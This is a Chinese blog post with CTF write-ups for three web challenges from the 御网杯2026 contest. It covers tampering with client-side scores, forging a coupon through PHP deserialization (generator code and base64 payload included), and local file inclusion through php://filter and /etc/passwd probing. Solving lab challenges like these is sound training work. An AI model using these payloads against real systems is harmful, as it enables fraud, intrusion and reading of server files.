---
title: 御网杯2026 Web部分题解
date: 2026-06-13 00:00:00
cover: https://img.jasmine-iris.top/posts/题解-御网杯Web/cover.webp
categories:
  - CTF-WP
  - Contest-WP
tags:
  - CTF
description: 御网杯网络安全竞赛Web方向部分题解
---

# 一、WEB-Snake_Game
## 1. 题目
![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549144062_knzoph.png)

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549146872_ume489.png)

## 2. 解题思路
1. 题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分>300
2. F12

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549148770_bbr1tu.png)

3. 添加覆盖脚本

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549150919_g090wf.png)![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549153714_bem3qs.png)

修改成功！

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549155953_my1lq3.png)

4. 拿到 flag

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549157554_wk4rax.png)

# 二、WEB-PHP_Payment
## 1. 题目
![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549159365_2vgsup.png)

## 2. 解题思路
1. 根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549161761_hri4nr.png)

2. 下载附件，收集信息

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549163363_rzxh8y.png)

代码审计 apply_coupon.php

1、包含了另外两个文件

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549164813_b6wic9.png)

2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549166346_y0axfr.png)

如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁 

再看models.php 里的类

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549168756_7wr9r6.png)

有两个属性，一是代金券金额，一是代金券码。

含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。

所以，目标就是，构造一个金额够买 Flag

3、 构造 代金券

```php
<?php
  class PromoManager {
  public $promo_code = "x";
  public $promo_credit = 10000000;
}
echo base64_encode(serialize(new PromoManager()));
?>
```

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549171609_b9v3g0.png)

```php
TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
```



![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549173620_fal65g.png)

3. 购买 Flag，看 buy.php

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549175160_j469ew.png)

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549177836_2nwrl6.png)

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549179726_t2m97u.png)

用 POST 方式往 /buy.php 传 item=flag

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549182185_lvr092.png)

依据这个 调用 fetch 

```plain
fetch('/buy.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'item=flag'}).then(r=>r.text()).then(console.log)
```

拿到 flag

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549184457_9oq1ms.png)

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549187215_b6fu4r.png)

# 三、WEB-Enterprise_OA
## 1. 题目
![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549189998_7v5029.png)

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549192238_a9cwl7.png)

## 2. 解题思路
1. 根据题目提示，这题考查目录穿越、文件包含
2. 先尝试访问 flag.php

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549195096_6cz0pe.png)

include_path='.:/usr/local/lib/php'

路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix/Linux 的特征。

并且服务器是：

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549197636_p6wc01.png)

说明可以用 /etc/passwd 来探测（因为/etc/passwd 一定存在、可读、内容可辨识）

3. 读源代码

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549199416_l9ovnu.png)

用 php 伪协议

```plain
php://filter/read=convert.base64-encode/resource=index.php
```

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549201464_n690eb.png)

利用 base64 在线解密工具

```plain
PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwMHB4OyBjb2xvcjogIzMzMzsgbGluZS1oZWlnaHQ6IDEuNjsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAgICAgRW50ZXJwcmlzZSBPQSBTeXN0ZW0KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJuYXYiPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPXB1YmxpY19ub3RpY2VzLnBocCI+Tm90aWNlczwvYT4KICAgICAgICAgICAgPGEgaHJlZj0iP21vZHVsZT1hYm91dC5waHAiPkFib3V0IFVzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWNvbnRhY3QucGhwIj5Db250YWN0PC9hPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRlbnQiPgogICAgICAgICAgICA8P3BocCBpbmNsdWRlKCRtb2R1bGUpOyA/PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgo= 
```

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549203409_rqahrv.png)

4. 访问绝对路径

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549205269_ujwcap.png)

5. 访问 flag 文件

比如：flag.php   flag.txt

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549208206_21rj7s.png)

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549210263_51flla.png)

![](https://img.jasmine-iris.top/posts/题解-御网杯Web/1786549212967_kctf2z.png)